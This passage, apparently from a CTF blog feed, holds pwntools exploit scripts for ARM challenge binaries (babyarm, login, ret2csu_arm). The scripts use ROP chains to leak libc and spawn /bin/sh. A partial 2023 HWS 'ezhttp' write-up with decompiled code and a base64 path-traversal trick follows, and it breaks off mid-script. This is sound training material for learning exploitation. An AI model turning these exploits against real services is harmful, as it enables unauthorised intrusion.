class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./chall_patch&quot;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;target remote localhost:1234&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0010C30&#x27;)</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span></span><br><span class="line">passwd=<span class="string">b&#x27;s1mpl3Dec0d4r&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">payload</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;msg&gt; &#x27;</span>,passwd)</span><br><span class="line">  sla(<span class="string">b&#x27;res&gt; &#x27;</span>,padding+payload)</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x1050C</span></span><br><span class="line">pop_r3_pc = <span class="number">0x10464</span></span><br><span class="line">pop_r4_r5_r6_r7 = <span class="number">0x10cb0</span></span><br><span class="line">mov_r0_r7 = <span class="number">0x10ca0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubuntu22 ~/s/d/2022_babyarm&gt; ROPgadget --binary ./chall --only pop                                                                                                                                     </span></span><br><span class="line"><span class="string">Gadgets information                                                                                                                                                                                                </span></span><br><span class="line"><span class="string">============================================================                                                                                                                                                       </span></span><br><span class="line"><span class="string">0x00010658 : pop &#123;fp, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x00010464 : pop &#123;r3, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x000105f0 : pop &#123;r4, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x00010cb0 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;      </span></span><br><span class="line"><span class="string">0x00010ca0 : mov r0, r7 ; blx r3 ; cmp r6, r4 ; bne #0x10c90 ; pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">overflow(p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(puts_got) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(puts_plt) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">b&#x27;nt&gt; &#x27;</span>)</span><br><span class="line"><span class="comment"># libc_base = u32(io.recv()[:4])</span></span><br><span class="line">libc_base =uu32(r(<span class="number">4</span>)) </span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc_base = libc_base - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line">overflow(p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./elec_system2_patch&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    <span class="comment"># io=process([&quot;qemu-arm&quot;,&quot;-g&quot;, &quot;1234&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi/&quot;,&quot;./elec_system2_patch&quot;])</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;target remote localhost:1234&#x27;)</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span></span><br><span class="line">sla(<span class="string">b&#x27;me: &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000105c0 : pop &#123;fp, pc&#125;</span></span><br><span class="line"><span class="string">0x000103f0 : pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="string">0x00010558 : pop &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">0x0001070c : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">0x000106fc : mov r0, r7 ; blx r3 ; cmp r6, r4 ; bne #0x106ec ; pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr=<span class="number">0x10474</span></span><br><span class="line">pop_r3_pc = <span class="number">0x000103f0</span></span><br><span class="line">pop_r4_r5_r6_r7 = <span class="number">0x0001070c</span></span><br><span class="line">mov_r0_r7 = <span class="number">0x000106fc</span></span><br><span class="line">paylaod=padding+p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(puts_got) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(puts_plt) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">8</span></span><br><span class="line">sla(<span class="string">b&#x27;ord: &#x27;</span>,paylaod)</span><br><span class="line">ru(<span class="string">b&#x27;ivity.\n&#x27;</span>)</span><br><span class="line">libc_base =uu32(r(<span class="number">4</span>)) </span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc_base = libc_base - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line">sla(<span class="string">b&#x27;me: &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">paylaod=padding+p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">0x10</span></span><br><span class="line">sla(<span class="string">b&#x27;ord: &#x27;</span>,paylaod)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2csu-arm"><a href="#ret2csu-arm" class="headerlink" title="ret2csu_arm"></a>ret2csu_arm</h2><p>,writelibcgadget__libc_csu_init</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000104E0</span></span><br><span class="line">.text:<span class="number">000104E0</span>             loc_104E0                               ; CODE XREF: __libc_csu_init+<span class="number">50</span>j</span><br><span class="line">.text:<span class="number">000104E0</span> <span class="number">09</span> <span class="number">20</span> A0 E1                 MOV     R2, R9</span><br><span class="line">.text:<span class="number">000104E4</span> <span class="number">08</span> <span class="number">10</span> A0 E1                 MOV     R1, R8</span><br><span class="line">.text:<span class="number">000104E8</span> <span class="number">07</span> <span class="number">00</span> A0 E1                 MOV     R0, R7</span><br><span class="line">.text:<span class="number">000104</span>EC <span class="number">04</span> <span class="number">30</span> <span class="number">95</span> E4                 LDR     R3, [R5],#<span class="number">4</span>     ; r5 got</span><br><span class="line">.text:<span class="number">000104F</span>0 <span class="number">01</span> <span class="number">40</span> <span class="number">84</span> E2                 ADD     R4, R4, #<span class="number">1</span></span><br><span class="line">.text:<span class="number">000104F</span>4 <span class="number">33</span> FF <span class="number">2F</span> E1                 BLX     R3</span><br><span class="line">.text:<span class="number">000104F</span>8 <span class="number">04</span> <span class="number">00</span> <span class="number">56</span> E1                 CMP     R6, R4</span><br><span class="line">.text:<span class="number">000104F</span>C F7 FF FF <span class="number">1</span>A                 BNE     loc_104E0</span><br><span class="line">.text:<span class="number">00010500</span> F0 <span class="number">87</span> BD E8                 POP     &#123;R4-R10,PC&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">ret2csu</span><span class="params">(padding,pop_r4_r10_ad,mov_r2_r9_ad,call_func_got_R5,arg0_R7,arg1_R8,arg2_R9,ret_ad)</span>:</span><br><span class="line">  &#x27;&#x27;&#x27;</span><br><span class="line">  pop_r4_r10_ad: csu POP     &#123;R4-R10,PC&#125;</span><br><span class="line">  mov_r2_r9_ad: csuMOV     R2, R9</span><br><span class="line">  call_func_got_R5:  got</span><br><span class="line">  arg0_R7:<span class="number">1</span></span><br><span class="line">  arg1_R8:<span class="number">2</span></span><br><span class="line">  arg2_R9:<span class="number">3</span></span><br><span class="line">  ret_ad:</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  R4=<span class="number">1</span></span><br><span class="line">  R6=<span class="number">2</span></span><br><span class="line">  R10=<span class="number">0xdeadbeef</span></span><br><span class="line">  payload=padding+p32(pop_r4_r10_ad)+p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(mov_r2_r9_ad)</span><br><span class="line">  payload+=p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(ret_ad)</span><br><span class="line">  sl(payload)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./ret2libc_arm&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io = process(pwnfile)</span></span><br><span class="line">    io = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,pwnfile])</span><br><span class="line">    <span class="meta">#io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./ret2libc_arm&quot;</span>])</span></span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">def ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,call_func_got_R5,arg0_R7,arg1_R8,arg2_R9,ret_ad):</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  pop_r4_r10_ad: csu POP     &#123;R4-R10,PC&#125;</span><br><span class="line">  mov_r2_r9_ad: csuMOV     R2, R9</span><br><span class="line">  call_func_got_R5:  got</span><br><span class="line">  arg0_R7:<span class="number">1</span></span><br><span class="line">  arg1_R8:<span class="number">2</span></span><br><span class="line">  arg2_R9:<span class="number">3</span></span><br><span class="line">  ret_ad:</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  R4=<span class="number">1</span></span><br><span class="line">  R6=<span class="number">2</span></span><br><span class="line">  R10=<span class="number">0xdeadbeef</span></span><br><span class="line">  payload=padding+p32(pop_r4_r10_ad)+p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(mov_r2_r9_ad)</span><br><span class="line">  payload+=p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(ret_ad)</span><br><span class="line">  ru(b<span class="string">&quot;put:&quot;</span>)</span><br><span class="line">  sl(payload)</span><br><span class="line">padding=<span class="number">12</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span></span><br><span class="line">pop_r4_r10_ad=<span class="number">0x0010500</span></span><br><span class="line">mov_r2_r9_ad=<span class="number">0x00104E0</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_ad=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,write_got,<span class="number">1</span>,write_got,<span class="number">0x10</span>,main_ad)</span><br><span class="line">ru(b<span class="number">&#x27;b</span>yebye<span class="number">&#x27;</span>)</span><br><span class="line">write_ad=uu32(r(<span class="number">4</span>))</span><br><span class="line">base=write_ad-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = base + next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line">bss=elf.bss()+<span class="number">0x100</span></span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,read_got,<span class="number">0</span>,bss,<span class="number">0x8</span>,main_ad)</span><br><span class="line">sl(p32(system_addr))</span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,bss,binsh,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xdeadbeff</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 HWS pwn</title>
      <link href="/2023/07/17/2023hws/"/>
      <url>/2023/07/17/2023hws/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog">https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog</a><br>llaa</p><h1 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-918h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-914h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-910h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 get_data_number; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  __int64 j; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8F8h]</span></span><br><span class="line">  <span class="type">char</span> *k; <span class="comment">// [rsp+40h] [rbp-8F0h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+50h] [rbp-8E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">64</span>]; <span class="comment">// [rsp+E0h] [rbp-850h] BYREF</span></span><br><span class="line">  <span class="type">char</span> haystack[<span class="number">256</span>]; <span class="comment">// [rsp+120h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">char</span> request_mode[<span class="number">256</span>]; <span class="comment">// [rsp+220h] [rbp-710h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [rsp+320h] [rbp-610h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">16</span>]; <span class="comment">// [rsp+520h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">5</span>]; <span class="comment">// [rsp+530h] [rbp-400h] BYREF</span></span><br><span class="line">  _BYTE v18[<span class="number">1011</span>]; <span class="comment">// [rsp+535h] [rbp-3FBh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+928h] [rbp-8h]</span></span><br></pre></td></tr></table></figure><p> sub_5596534A9993(a1, s, request_mode, k, v4);execl(a2, 0LL);bin&#x2F;sh</p><p>haystackhtdocsa2 htdocsOpt&#x2F;lampp&#x2F;htdocshaystackhtdocs&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;shstrstr(haystack, ..)..&#x2F; get_data_number &#x3D; get_data(a1, input, 1024)v18sub_5596534A8766(v18, v12);v12haystacksub_5596534A8766v18v12v12+63haystack&#x2F;&#x2F;.Ly8u&#x2F;..Ly4uL&#x3D;&#x3D;&#x3D;&#x2F;htdocs&#x2F;.&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;bin&#x2F;sh,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_5596534A8766</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 j; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 k; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 m; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 s; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+25h] [rbp-Bh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+26h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+27h] [rbp-9h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">                                                <span class="comment">// a1  a2+64</span></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(v10 + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">255</span>, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x3F</span>u; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[j] == *(v10 + a1) )</span><br><span class="line">        s = j;                                  <span class="comment">// 11 L</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[k] == *(v10 + <span class="number">1LL</span> + a1) )</span><br><span class="line">        v13 = k;                                <span class="comment">// 50 y</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">0x3F</span>u; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[m] == *(v10 + <span class="number">2LL</span> + a1) )</span><br><span class="line">        v14 = m;                                <span class="comment">// 56 4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">0x3F</span>u; ++n )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[n] == *(v10 + <span class="number">3LL</span> + a1) )</span><br><span class="line">        v15 = n;                                <span class="comment">// 46 u</span></span><br><span class="line">    &#125;</span><br><span class="line">    v2 = i++;</span><br><span class="line">    *(v2 + a2) = (v13 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span> | (<span class="number">4</span> * s);      <span class="comment">// v13=50 s=11 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">2LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = i++;</span><br><span class="line">    *(v3 + a2) = (v14 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span> | (<span class="number">16</span> * v13); <span class="comment">// v14=56 111000 .  60 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">3LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = i;</span><br><span class="line">    *(v4 + a2) = v15 &amp; <span class="number">63</span> | (v14 &lt;&lt; <span class="number">6</span>);         <span class="comment">// v15 46 .   v1400</span></span><br><span class="line">    v10 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span 